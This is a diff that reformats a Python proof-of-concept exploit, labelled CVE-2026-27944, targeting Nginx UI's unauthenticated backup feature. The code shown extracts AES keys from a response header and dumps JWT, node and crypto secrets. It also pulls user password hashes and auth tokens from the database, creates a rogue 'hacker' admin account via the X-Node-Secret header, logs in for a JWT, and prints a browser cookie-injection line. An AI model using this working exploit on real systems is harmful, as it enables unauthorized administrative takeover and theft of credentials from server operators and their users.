@@ -21,7 +21,6 @@ import os
 import secrets
 import sqlite3
 import string
-import struct
 import sys
 import tempfile
 import time
@@ -30,9 +29,9 @@ import zipfile
 from pathlib import Path
 
 try:
-    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
     from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 except ImportError:
     print("Please install cryptography: pip install cryptography")
     sys.exit(1)
@@ -65,8 +64,8 @@ def parse_security_header(header: str) -> tuple[bytes, bytes]:
     key_b64, iv_b64 = header.split(":")
     key = base64.b64decode(key_b64)
     iv = base64.b64decode(iv_b64)
-    print(f"[+] AES Key ({len(key)*8}-bit): {key.hex()}")
-    print(f"[+] AES IV  ({len(iv)*8}-bit): {iv.hex()}")
+    print(f"[+] AES Key ({len(key) * 8}-bit): {key.hex()}")
+    print(f"[+] AES IV  ({len(iv) * 8}-bit): {iv.hex()}")
     return key, iv
 
 
@@ -107,7 +106,7 @@ def extract_secrets(decrypted_files: dict[str, bytes], output_dir: str) -> dict:
             secrets["node_secret"] = config.get("node", "Secret", fallback="")
             secrets["crypto_secret"] = config.get("crypto", "Secret", fallback="")
 
-            print(f"\n[+] === Extracted Secrets from app.ini ===")
+            print("\n[+] === Extracted Secrets from app.ini ===")
             print(f"    JwtSecret:    {secrets['jwt_secret']}")
             print(f"    Node Secret:  {secrets['node_secret']}")
             print(f"    Crypto Secret: {secrets['crypto_secret']}")
@@ -121,28 +120,36 @@ def extract_secrets(decrypted_files: dict[str, bytes], output_dir: str) -> dict:
             conn = sqlite3.connect(db_path)
             cursor = conn.cursor()
 
-            print(f"\n[+] === Users from database ===")
+            print("\n[+] === Users from database ===")
             try:
                 for row in cursor.execute("SELECT id, name, password FROM users"):
                     print(f"    ID={row[0]}  Name={row[1]}  Password={row[2]}")
-                    secrets.setdefault("users", []).append({
-                        "id": row[0], "name": row[1], "password_hash": row[2]
-                    })
+                    secrets.setdefault("users", []).append(
+                        {"id": row[0], "name": row[1], "password_hash": row[2]}
+                    )
             except sqlite3.OperationalError:
                 print("    (no users table found)")
 
-            print(f"\n[+] === Active Auth Tokens ===")
+            print("\n[+] === Active Auth Tokens ===")
             try:
-                tokens = list(cursor.execute(
-                    "SELECT user_id, token, short_token, expired_at FROM auth_tokens"
-                ))
+                tokens = list(
+                    cursor.execute(
+                        "SELECT user_id, token, short_token, expired_at FROM auth_tokens"
+                    )
+                )
                 if tokens:
                     for row in tokens:
-                        print(f"    UserID={row[0]}  Token={row[1][:40]}...  Expires={row[3]}")
-                        secrets.setdefault("tokens", []).append({
-                            "user_id": row[0], "token": row[1],
-                            "short_token": row[2], "expired_at": row[3]
-                        })
+                        print(
+                            f"    UserID={row[0]}  Token={row[1][:40]}...  Expires={row[3]}"
+                        )
+                        secrets.setdefault("tokens", []).append(
+                            {
+                                "user_id": row[0],
+                                "token": row[1],
+                                "short_token": row[2],
+                                "expired_at": row[3],
+                            }
+                        )
                 else:
                     print("    (no active tokens)")
             except sqlite3.OperationalError:
@@ -155,14 +162,14 @@ def extract_secrets(decrypted_files: dict[str, bytes], output_dir: str) -> dict:
 
 def exploit_node_secret(target: str, node_secret: str):
     """Use X-Node-Secret to access admin API."""
-    print(f"\n[*] === Exploiting with X-Node-Secret ===")
+    print("\n[*] === Exploiting with X-Node-Secret ===")
 
     url = f"{target}/api/users"
     req = urllib.request.Request(url, headers={"X-Node-Secret": node_secret})
     try:
         resp = urllib.request.urlopen(req, timeout=10)
         data = json.loads(resp.read())
-        print(f"[+] Admin API access successful!")
+        print("[+] Admin API access successful!")
         print(f"[+] Response from {url}:")
         print(json.dumps(data, indent=2))
         return True
@@ -173,33 +180,42 @@ def exploit_node_secret(target: str, node_secret: str):
 
 def obtain_admin_token(target: str, node_secret: str, username: str = "hacker") -> str:
     """Create a new admin user via X-Node-Secret, then login to obtain JWT token."""
-    print(f"\n[*] === Obtaining Admin JWT Token ===")
+    print("\n[*] === Obtaining Admin JWT Token ===")
 
-    password = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
+    password = "".join(
+        secrets.choice(string.ascii_letters + string.digits) for _ in range(16)
+    )
 
     # Step 1: Create a new admin user via X-Node-Secret
     print(f"[*] Creating new admin user '{username}' via X-Node-Secret...")
     body = json.dumps({"name": username, "password": password}).encode()
     req = urllib.request.Request(
-        f"{target}/api/users", data=body, method="POST",
+        f"{target}/api/users",
+        data=body,
+        method="POST",
         headers={"Content-Type": "application/json", "X-Node-Secret": node_secret},
     )
     try:
         resp = urllib.request.urlopen(req, timeout=10)
         user_data = json.loads(resp.read())
-        print(f"[+] User '{username}' created (ID={user_data['id']}), password: {password}")
+        print(
+            f"[+] User '{username}' created (ID={user_data['id']}), password: {password}"
+        )
     except urllib.error.HTTPError as e:
         print(f"[-] Failed to create user: HTTP {e.code} - {e.read().decode()}")
         return ""
 
     # Step 2: Get RSA public key for encrypted login
-    print(f"[*] Fetching RSA public key...")
-    body = json.dumps({
-        "timestamp": int(time.time()),
-        "fingerprint": hashlib.sha256(b"poc").hexdigest(),
-    }).encode()
+    print("[*] Fetching RSA public key...")
+    body = json.dumps(
+        {
+            "timestamp": int(time.time()),
+            "fingerprint": hashlib.sha256(b"poc").hexdigest(),
+        }
+    ).encode()
     req = urllib.request.Request(
-        f"{target}/api/crypto/public_key", data=body,
+        f"{target}/api/crypto/public_key",
+        data=body,
         headers={"Content-Type": "application/json"},
     )
     try:
@@ -213,18 +229,23 @@ def obtain_admin_token(target: str, node_secret: str, username: str = "hacker") 
 
     # Step 3: RSA-encrypt login credentials and authenticate
     print(f"[*] Logging in as '{username}'...")
-    params = json.dumps({"name": username, "password": password, "nonce": nonce}).encode()
+    params = json.dumps(
+        {"name": username, "password": password, "nonce": nonce}
+    ).encode()
     encrypted = pub_key.encrypt(params, asym_padding.PKCS1v15())
-    body = json.dumps({"encrypted_params": base64.b64encode(encrypted).decode()}).encode()
+    body = json.dumps(
+        {"encrypted_params": base64.b64encode(encrypted).decode()}
+    ).encode()
     req = urllib.request.Request(
-        f"{target}/api/login", data=body,
+        f"{target}/api/login",
+        data=body,
         headers={"Content-Type": "application/json"},
     )
     try:
         resp = urllib.request.urlopen(req, timeout=10)
         data = json.loads(resp.read())
         token = data["token"]
-        print(f"[+] Login successful! JWT token obtained.")
+        print("[+] Login successful! JWT token obtained.")
         return token
     except urllib.error.HTTPError as e:
         print(f"[-] Login failed: HTTP {e.code} - {e.read().decode()}")
@@ -235,12 +256,21 @@ def main():
     parser = argparse.ArgumentParser(
         description="CVE-2026-27944 - Nginx UI Unauthenticated Backup Exploit"
     )
-    parser.add_argument("-u", "--url", required=True,
-                        help="Target URL (e.g. http://localhost:9000)")
-    parser.add_argument("-o", "--output", default=None,
-                        help="Output directory for decrypted files (default: temp dir)")
-    parser.add_argument("--create-user", metavar="USERNAME", default=None,
-                        help="Create a new admin user and obtain JWT token for browser access")
+    parser.add_argument(
+        "-u", "--url", required=True, help="Target URL (e.g. http://localhost:9000)"
+    )
+    parser.add_argument(
+        "-o",
+        "--output",
+        default=None,
+        help="Output directory for decrypted files (default: temp dir)",
+    )
+    parser.add_argument(
+        "--create-user",
+        metavar="USERNAME",
+        default=None,
+        help="Create a new admin user and obtain JWT token for browser access",
+    )
     args = parser.parse_args()
 
     target = args.url.rstrip("/")
@@ -282,16 +312,18 @@ def main():
         token = obtain_admin_token(target, node_secret, args.create_user)
 
     # Summary
-    print(f"\n{'='*60}")
-    print(f"[+] Exploitation complete!")
+    print(f"\n{'=' * 60}")
+    print("[+] Exploitation complete!")
     print(f"[+] Decrypted files saved to: {output_dir}")
     if node_secret:
-        print(f"[+] Admin API: curl -H 'X-Node-Secret: {node_secret}' {target}/api/users")
+        print(
+            f"[+] Admin API: curl -H 'X-Node-Secret: {node_secret}' {target}/api/users"
+        )
     if token:
         print(f"[+] JWT Token: {token}")
-        print(f"[+] Browser access: paste the following in browser console (F12):")
+        print("[+] Browser access: paste the following in browser console (F12):")
         print(f'    document.cookie="token={token};path=/"')
-        print(f"    Then refresh the page to enter admin panel.")
+        print("    Then refresh the page to enter admin panel.")
 
 
 if __name__ == "__main__":
